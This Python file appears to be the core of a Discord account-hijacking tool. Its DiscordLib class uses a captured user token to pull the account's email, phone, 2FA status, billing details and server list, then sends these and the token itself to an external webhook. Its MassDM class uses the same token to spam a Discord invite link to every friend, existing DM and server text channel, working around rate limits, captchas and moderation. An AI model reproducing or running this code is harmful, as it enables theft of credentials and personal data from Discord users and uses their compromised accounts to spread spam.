from time import time
from urllib import request
import requests
import json
from discord_webhook   import DiscordWebhook, DiscordEmbed
import time
from config import config
import asyncio

from colorama import Fore
from colorama import Style
from datetime import datetime
import aiohttp

class DiscordLib:
    def get_headers(self, token, content_type="application/json"):
        headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",      
    }
        if token:
            headers.update({"Authorization": token})
        return headers
    
    def get_details(self, token):
        req = requests.get('https://discordapp.com/api/v6/users/@me', headers=self.get_headers(token)).json()
        if not req['phone']:
            req['phone'] = False

        return req
               
    def get_relationships(self, token):
        req = requests.get('https://discordapp.com/api/v6/users/@me/relationships', headers=self.get_headers(token)).json()
        return len(req)
    
    def get_guilds(self, token):
        req = requests.get("https://discordapp.com/api/v6/users/@me/guilds", headers=self.get_headers(token)).json()

        return req
        
    def get_payment(self, token):
        req = requests.get("https://discordapp.com/api/users/@me/billing/payment-sources", headers=self.get_headers(token)).json()
        #disord just returns an empty array if no billing
        return bool(len(req))

    def generate_embed(self, token):
        details = self.get_details(token)

            
        if "premium_type" in details:
            if details['premium_type'] == 1:
                nitro = "Classic"
            elif details['premium_type'] == 2:
                nitro = True
        else:
            nitro = False
            
            
        guilds = self.get_guilds(token)
        numGuilds = 0
        for guild in guilds:
            if guild["owner"]:
                numGuilds += 1

        embed = DiscordEmbed()
        embed.set_author(name=f"{details['username']}#{details['discriminator']}:{details['id']}", icon_url=f"https://cdn.discordapp.com/avatars/{details['id']}/{details['avatar']}.webp?size=128")
        embed.add_embed_field(name='Token',         value=token, inline=False)
        embed.add_embed_field(name='Email',         value=details['email'], inline=False)
        embed.add_embed_field(name='Phone',         value=details['phone'], inline=False)
        embed.add_embed_field(name='2FA',           value=details["mfa_enabled"])
        embed.add_embed_field(name='Nitro',         value=nitro)
        embed.add_embed_field(name='Billing',       value=self.get_payment(token))
        embed.add_embed_field(name='Relationships', value=self.get_relationships(token))
        embed.add_embed_field(name='Guilds',        value=len(guilds))
        embed.add_embed_field(name='Owned Guilds',  value=numGuilds)
        return embed
    
    
    def send_webhook(self, token):
        webhook = DiscordWebhook(url=config["webhook_url"])
        
        webhook.add_embed(self.generate_embed(token))
        try:
            webhook.execute()
        except Exception:
            print('Failed to send webhook')
            
    


class MassDM:
    async def init(self, token, name):
        self.token = token
        self.headers = await self.get_headers(token)
        self.name = name
        self.loop = asyncio.get_running_loop()


    async def get_headers(self, token, content_type="application/json"):
        headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",      
            }
        if token:
            headers.update({"Authorization": token})
        return headers
    
    async def get_guilds(self):
        async with aiohttp.request("GET", "https://discordapp.com/api/v6/users/@me/guilds", headers=self.headers) as resp:
            return await resp.json()

    async def get_guild_channels(self, guild_id):
        async with aiohttp.request("GET", f"https://discordapp.com/api/guilds/{guild_id}/channels", headers=self.headers) as resp:
            return await resp.json()


    async def get_dms(self):
        async with aiohttp.request("GET", f"https://discord.com/api/v8/users/@me/channels", headers=self.headers) as resp:
            return await resp.json()


    async def get_relationships(self):
        async with aiohttp.request("GET", f"https://discordapp.com/api/v6/users/@me/relationships", headers=self.headers) as resp:
            return await resp.json()


    
    async def message_channel(self, channel_id):
        while True:
            payload = {
                "content": "https://discord.gg/BNP7fkyYMu"
            }
            async with aiohttp.request("POST", f"https://discordapp.com/api/channels/{channel_id}/messages", headers=self.headers, json=payload) as resp:

                data = await resp.json()
                print(data)
                if resp.status == 401: #
                    break
            
                if resp.status == 403:
                    break

                if 'You need to verify your account in order to perform this action.' in data:
                    return 'locked'

                if 'captcha_key' in data:
                    return "captcha"

                if 'retry_after' in data:
                    if data['retry_after']/1000 > 10:
                        return "rate_limit"
                    print(data['retry_after']/1000, " seconds")
                    await asyncio.sleep(data['retry_after']/1000)

                if 'Message was blocked by automatic moderation' in data:
                    return 'moderation'
                if 'code' in data:
                    if data['code'] == 50007:
                        break
                
                if 'Missing Access' in data:
                    break
                
                if 'id' in data:
                    break
                


    async def open_dm(self, recipient):
        payload = {"recipients": [recipient]} #[] because its an array just only 1 element, this endpoint designed to support multiple people
        async with aiohttp.request("POST", f"https://discord.com/api/users/@me/channels", headers=self.headers, json=payload) as resp:
            data = await resp.json()
            return data['id']
    
    async def close_dm(self, dm_id):
        async with aiohttp.request("DELETE", f"https://discord.com/api/v8/channels/{dm_id}", headers=self.headers):
            return

    async def message_friends(self):
        for relationship in await self.get_relationships():
            if not 'type' in relationship: #check if any relationships
                return

            if relationship['type'] == 1:
                dm_id = await self.open_dm(relationship['id'])
                resp = await self.message_channel(dm_id)
                if resp == "captcha":
                    return
                if resp == "rate_limit":
                    return
                if resp == "locked":
                    return
                if resp == "moderation":
                    return
                await self.close_dm(dm_id)
                print(f'{Fore.BLUE}[{datetime.now()}] [MassDM] [USER:{self.name}] [FRIEND:{relationship["user"]["username"]}#{relationship["user"]["discriminator"]}]')


    
    async def message_dms(self):
        for dm in await self.get_dms():
            if not 'id' in dm: # check if any dms
                return

            resp = await self.message_channel(dm['id'])
            if resp == "captcha":
                return
            if resp == "rate_limit":
                return
            if resp == "locked":
                return
            if resp == "moderation":
                return
            await self.close_dm(dm['id'])
            print(f'{Fore.BLUE}[{datetime.now()}] [MassDM] [USER:{self.name}] [DM:{len(dm["recipients"])}]')



    async def message_guilds(self):
        for guild in await self.get_guilds():
            if not 'id' in guild: #check if any guilds
                return

            for channel in await self.get_guild_channels(guild['id']):
                if not 'type' in channel: #check if any channels
                    return

                if channel['type'] == 0:
                    resp = await self.message_channel(channel['id'])
                    if resp == "captcha":
                        return
                    if resp == "rate_limit":
                        return
                    if resp == "locked":
                        return
                    if resp == "moderation":
                        return
                    print(f'{Fore.BLUE}[{datetime.now()}] [MassDM] [USER:{self.name}] [GUILD:{guild["name"]}] [CHANNEL:{channel["name"]}]')

    

        